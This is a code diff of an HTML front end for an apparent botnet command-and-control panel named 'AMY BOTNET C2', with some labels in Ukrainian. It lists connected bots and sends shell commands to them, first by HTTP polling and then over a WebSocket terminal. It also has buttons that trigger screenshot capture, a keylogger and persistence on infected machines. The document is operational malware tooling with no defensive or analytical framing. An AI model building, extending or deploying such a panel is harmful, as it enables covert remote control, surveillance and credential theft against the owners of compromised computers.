@@ -1,89 +1,107 @@
 <!DOCTYPE html>
-<html>
+<html lang="uk">
 <head>
-    <title>AMY BOTNET C2</title>
+    <meta charset="UTF-8">
+    <title>AMY Botnet C2</title>
+    <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { background: #050505; color: #ff3333; font-family: monospace; padding: 20px; }
-        .grid { display: grid; grid-template-columns: 250px 1fr; gap: 20px; }
-        .panel { border: 1px solid #440000; padding: 15px; background: #0a0a0a; position: relative; }
-        .bot { padding: 8px; border-bottom: 1px solid #220000; cursor: pointer; }
-        .bot:hover { background: #220000; }
-        .bot.selected { background: #ff3333; color: #000; }
-        input { background: #000; border: 1px solid #ff3333; color: #0f0; padding: 8px; width: 95%; margin-bottom: 10px; }
-        button { background: #ff3333; color: #000; border: none; padding: 12px; width: 100%; cursor: pointer; font-weight: bold; margin-bottom: 5px; }
-        #output { background: #000; color: #0f0; border: 1px solid #111; padding: 10px; height: 300px; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
-        #scr-viewer { display:none; position:fixed; top:5%; left:10%; width:80%; height:80%; border:2px solid #ff3333; background:#000; z-index:100; text-align:center; padding:10px; box-shadow: 0 0 50px #ff0000;}
-        #scr-viewer img { max-width: 100%; max-height: 90%; border: 1px solid #333; }
+        .terminal { 
+            background:#0a0a0a; 
+            font-family:monospace; 
+            color:#00ff41; 
+            height:480px; 
+            overflow-y:auto; 
+            padding:15px; 
+            border:1px solid #450a0a; 
+        }
+        .bot-active { background:#450a0a; border-left:4px solid #ef4444; }
+        .status-box { background:#1f2937; border:1px solid #ef4444; }
+
+        button {
+            color: white !important;
+            font-weight: 700 !important;
+            text-shadow: 0 0 1px rgba(0,0,0,0.8);
+        }
+        button:hover {
+            filter: brightness(1.15);
+        }
     </style>
 </head>
-<body>
-    <h1>AMY BOTNET C2</h1>
-    <div id="scr-viewer">
-        <button onclick="document.getElementById('scr-viewer').style.display='none'" style="width:100px; float:right;">CLOSE [X]</button>
-        <h3 id="scr-title">Last Screenshot From Target</h3>
-        <img id="scr-img" src="">
-    </div>
-    <div class="grid">
-        <div class="panel">
-            <h3>Bots (<span id="cnt">0</span>)</h3>
-            <div id="blist"></div>
+<body class="bg-zinc-950 text-red-400 p-8">
+    <h1 class="text-5xl font-bold mb-6 text-red-600">AMY BOTNET C2</h1>
+
+    <div class="grid grid-cols-12 gap-6">
+        <div class="col-span-3">
+            <h2 class="text-xl mb-3">Active Bots (<span id="count" class="text-red-500">0</span>)</h2>
+            <div id="botlist" class="space-y-2"></div>
         </div>
-        <div class="panel">
-            <h3>Control</h3>
-            <input type="text" id="bid" placeholder="Bot ID" readonly>
-            <input type="text" id="cmd" value="shell:ls -la">
-            <button onclick="send()">EXECUTE COMMAND</button>
-            <button onclick="send('screenshot')" style="background:#880000; color:white;">TAKE SCREENSHOT</button>
-            <div id="output">Terminal ready...</div>
+
+        <div class="col-span-9">
+            <!-- Статус бота -->
+            <div class="status-box p-4 mb-4 rounded flex items-center">
+                <span class="text-red-500 font-bold mr-3">СТАТУС БОТА:</span> 
+                <span id="selected-bot" class="text-white font-mono text-lg">— none selected —</span>
+            </div>
+
+            <div class="flex gap-4 mb-4">
+                <button onclick="takeScreenshot()" class="bg-orange-600 hover:bg-orange-700 px-6 py-3.5 rounded flex-1">📸 Screenshot</button>
+                <button onclick="toggleKeylogger()" class="bg-purple-600 hover:bg-purple-700 px-6 py-3.5 rounded flex-1">⌨️ Keylogger</button>
+                <button onclick="addPersistence()" class="bg-amber-600 hover:bg-amber-700 px-6 py-3.5 rounded flex-1">🔒 Persistence</button>
+            </div>
+
+            <div class="terminal" id="terminal">Terminal ready...</div>
+            
+            <div class="flex mt-3 gap-3">
+                <input id="cmd" class="flex-1 bg-zinc-900 border border-red-900 p-4 rounded text-white placeholder-zinc-500" 
+                       placeholder="whoami або shell:dir" onkeypress="if(event.key==='Enter') sendCommand()">
+                <button onclick="sendCommand()" class="bg-red-600 hover:bg-red-700 px-12 rounded font-bold">SEND</button>
+            </div>
         </div>
     </div>
 
     <script>
-        let sel = "";
-        async function refresh() {
-            const r = await fetch('/bots');
-            const d = await r.json();
-            document.getElementById('cnt').innerText = d.bots.length;
-            const list = document.getElementById('blist');
-            list.innerHTML = "";
-            d.bots.forEach(id => {
-                const div = document.createElement('div');
-                div.className = 'bot' + (id === sel ? ' selected' : '');
-                div.innerText = id;
-                div.onclick = () => { sel = id; document.getElementById('bid').value = id; refresh(); };
-                list.appendChild(div);
+        let currentBot = null;
+        let terminalWs = null;
+
+        async function updateBots() {
+            const res = await fetch('/bots');
+            const data = await res.json();
+            document.getElementById('count').textContent = data.bots.length;
+
+            let html = '';
+            data.bots.forEach(bot => {
+                html += `<div onclick="selectBot('${bot}')" class="p-3 rounded cursor-pointer hover:bg-zinc-800 ${currentBot === bot ? 'bot-active' : ''}">${bot}</div>`;
             });
+            document.getElementById('botlist').innerHTML = html || '<div class="text-zinc-500 p-3">No bots connected</div>';
         }
 
-        async function send(forceCmd = null) {
-            if(!sel) return alert("Select a bot!");
-            const cmd = forceCmd || document.getElementById('cmd').value;
-            const out = document.getElementById('output');
-            out.innerText += `\n> Executing: ${cmd}...`;
+        function selectBot(bot) {
+            currentBot = bot;
+            document.getElementById('selected-bot').textContent = bot;
+            updateBots();
             
-            await fetch(`/command?bot_id=${sel}&command=${cmd}`, {method: 'POST'});
-            
-            const poll = setInterval(async () => {
-                const r = await fetch(`/response/${sel}`);
-                const d = await r.json();
-                if(d.response && d.response !== "Waiting for bot...") {
-                    if(d.is_img || d.response === "SCREENSHOT_LOADED") {
-                        out.innerText += `\n[SUCCESS] Image received.`;
-                        const img = document.getElementById('scr-img');
-                        // Додаємо таймштамп, щоб браузер не брав стару картинку з кешу
-                        img.src = `/view_screenshot/${sel}?cache=` + Math.random();
-                        document.getElementById('scr-viewer').style.display = 'block';
-                    } else {
-                        out.innerText += `\n[RESPONSE]:\n${d.response}`;
-                    }
-                    out.scrollTop = out.scrollHeight;
-                    clearInterval(poll);
-                }
-            }, 1000);
+            if (terminalWs) terminalWs.close();
+            terminalWs = new WebSocket(`ws://${location.host}/terminal/${currentBot}`);
+            terminalWs.onmessage = (e) => {
+                const term = document.getElementById('terminal');
+                term.innerHTML += '<br>> ' + e.data;
+                term.scrollTop = term.scrollHeight;
+            };
         }
 
-        setInterval(refresh, 3000);
-        refresh();
+        function sendCommand() {
+            const cmd = document.getElementById('cmd').value.trim();
+            if (!currentBot || !cmd || !terminalWs) return;
+            terminalWs.send(cmd);
+            document.getElementById('cmd').value = '';
+        }
+
+        function takeScreenshot() { if (currentBot) fetch(`/screenshot/${currentBot}`); }
+        function toggleKeylogger() { if (currentBot) fetch(`/keylogger/${currentBot}`); }
+        function addPersistence() { if (currentBot) fetch(`/persistence/${currentBot}`); }
+
+        setInterval(updateBots, 2500);
+        updateBots();
     </script>
 </body>
 </html>
